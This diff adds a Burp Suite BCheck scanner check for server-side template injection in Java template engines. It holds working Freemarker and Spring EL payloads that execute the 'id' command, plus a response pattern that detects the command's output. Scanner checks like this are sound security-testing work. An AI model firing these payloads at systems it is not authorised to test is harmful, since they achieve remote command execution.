@@ -1,0 +1,22 @@
+metadata:
+    language: v2-beta
+    name: "SSTI - Freemarker and Velocity RCE"
+    description: "Tests for SSTI in Java template engines (Freemarker, Velocity, Pebble, Thymeleaf)"
+    author: "BCheck Arsenal"
+    tags: "ssti", "java", "rce", "waf-bypass"
+
+given insertion point then
+    send payload:
+        replacing: "{insertion_point}"
+        following replacements:
+            - "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"
+            - "${\".freemarker.template.utility.Execute\"?new()(\"id\")}"
+            - "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x"
+
+    if {check.response} matches "(uid=|gid=|freemarker|java\.lang\.Runtime|ProcessBuilder)" then
+        report issue:
+            severity: high
+            confidence: certain
+            detail: "SSTI in Java template engine detected with command execution."
+            remediation: "Disable dangerous built-in functions. Use template sandboxing."
+    end if
